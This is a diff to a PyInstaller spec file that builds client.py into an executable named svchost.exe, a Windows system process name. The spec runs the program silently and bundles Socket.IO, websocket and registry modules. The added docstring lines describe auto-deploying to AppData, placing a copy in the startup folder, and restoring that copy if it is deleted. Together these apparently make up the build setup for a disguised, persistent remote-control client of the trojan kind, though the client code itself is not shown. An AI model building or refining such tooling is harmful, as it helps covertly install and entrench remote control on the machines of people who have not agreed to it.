@@ -4,6 +4,8 @@ Simplified PyInstaller spec file for compiling client.py to svchost.exe
 - Silent execution (no console window)
 - All dependencies bundled
 - Optimized for Windows deployment with Python 3.13
+- Auto-deploys to AppData with startup folder duplicate
+- Monitors and restores startup folder copy if deleted
 """
 
 block_cipher = None
@@ -25,6 +27,49 @@ hiddenimports = [
     'win32service',
     'win32com.client',
     'comtypes.client',
+    'winreg',
+    'shutil',
+    'threading',
+    'time',
+    # Socket.IO and dependencies (CRITICAL!)
+    'socketio',
+    'socketio.client',
+    'socketio.packet',
+    'socketio.namespace',
+    'socketio.exceptions',
+    'engineio',
+    'engineio.client',
+    'engineio.packet',
+    'engineio.payload',
+    'engineio.socket',
+    'engineio.server',
+    'engineio.async_client',
+    'engineio.async_server',
+    # Eventlet modules (OPTIONAL)
+    'eventlet',
+    'eventlet.hubs',
+    'eventlet.hubs.hub',
+    'eventlet.hubs.poll',
+    'eventlet.hubs.selects',
+    'eventlet.greenthread',
+    'eventlet.greenpool',
+    'eventlet.queue',
+    'eventlet.timeout',
+    'eventlet.wsgi',
+    'eventlet.green',
+    'eventlet.green.socket',
+    'eventlet.green.threading',
+    'eventlet.green.select',
+    'eventlet.green.ssl',
+    # Additional imports
+    'requests',
+    'urllib3',
+    'certifi',
+    'ssl',
+    'http',
+    'http.client',
+    'websocket',
+    '_websocket',
 ]
 
 a = Analysis(
